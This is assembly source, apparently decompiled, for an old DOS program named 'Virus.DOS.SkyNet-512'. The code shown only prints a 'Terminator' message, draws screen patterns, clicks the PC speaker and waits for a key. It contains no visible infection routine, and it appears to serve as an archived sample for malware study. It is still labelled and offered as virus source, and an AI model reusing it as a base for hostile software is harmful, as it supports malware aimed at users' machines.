; "Virus.DOS.SkyNet-512" / skynet.com (512)
; Either author or license are unknown, so I'll use UNLICENSE.

	use16
	org 0x0100; COM file format generation

start	
	push cs
	pop ds
	mov dx,v001A
	mov ah,0x09
	int 0x21
	mov al,0x10
	call v01E9
	call v0118
v0011:
	mov ax,0x3
	int 0x10
	mov ah,0x4C
	int 0x21
;---
	v001A db '*** Terminator I *** Created by Sky Net in Chung-Li.',0x0D,0x0A,'$'
	db 0x1F
	db 'Terminator Message:',0x0D
	db 0x1F,0x0D
	db ' Don',0x27,'t be afraid.',0x0D
	db 0x1D
	db 'I am a very kind virus.',0x0D
	db 0x1A
	db 'You have do many works today.',0x0D
	db 0x27
	db 'So,',0x0D
	db 0x17
	db 'I will let your computer slow down.',0x0D,' Have a nice day,',0x0D,'$'
	db 'Goodbye.',0x0D,'$'
	db 0x0D,0x1A
	db 'Press a key to continue. . .'
	db 0
;---
v0118:
	mov dx,0xB800
	int 0x11
	test ah,0x08
	jz v0125
	mov dx,0xB000
v0125:
	mov es,dx
	mov ax,0x00DB
	mov cx,0x07D0
	xor di,di
	rep stosw
	mov al,0x0F
	mov bx,0x07D1
	mov bp,bx
	mov si,bp
	mov di,si
	mov cx,0x0002
	mov dx,0x0002
v0142:
	push cx
	mov cx,0x0006
v0146:
	call v01E9
	mov [es:bx],al
	mov [es:bp],al
	mov [es:si],al
	mov [es:di],al
	add bx,dx
	sub bp,dx
	add si,0x00A0
	sub di,0x00A0
	loop v0146
	xor al,al
	neg dx
	xchg si,di
	pop cx
	loop v0142
	call v01E9
	mov ax,0x4E20
	mov cx,0x07D0
	xor di,di
	rep stosw
	xor bx,bx
	mov si,0x0151
	mov dh,0x07
v0181:
	mov ah,0x02
	mov dl,[si]
	inc si
	int 0x10
	inc dh
v018A:
	push ax
	mov ah,0x01
	int 0x16
	pop ax
	jz v019F
	push ax
	mov ah,0x00
	int 0x16
	cmp al,0x1B
	pop ax
	jnz v019F
	jmp v0011
v019F:
	mov al,[si]
	inc si
	or al,al
	jz v01C8
	cmp al,0x20
	je v01AE
	cmp al,0x0D
	jne v01BC
v01AE:
	mov cx,0x0A
v01B1:
	call v01E9
	loop v01B1
	cmp al,0x0D
	jne v01BC
	jmp short v0181
v01BC:
	call v01D3
	call v01E9
	mov ah,0x0E
	int 0x10
	jmp short v018A
v01C8:
	xor ah,ah
	int 0x16
	cmp al,0x1B
	jne v01C8
	jmp v0011
v01D3:
	push ax
	mov ah,0x7F
	in al,0x61
	and al,0xFC
v01DA:
	xor al,0x02
	out 0x61,al
	mov cx,0x0100
v01E1:
	loop v01E1
	dec ah
	jnz v01DA
	pop ax
	retn
v01E9:
	push ax
	push cx
	push dx
	mov ah,0x2C
	int 0x21
v01F0:
	push dx
	mov ah,0x2C
	int 0x21
	mov al,dl
	pop dx
	cmp al,dl
	je v01F0
	pop dx
	pop cx
	pop ax
	retn

; Decompiled with Diicorp95's Decomp.AI
; HIEW, Insight, Sourcer were used in work.
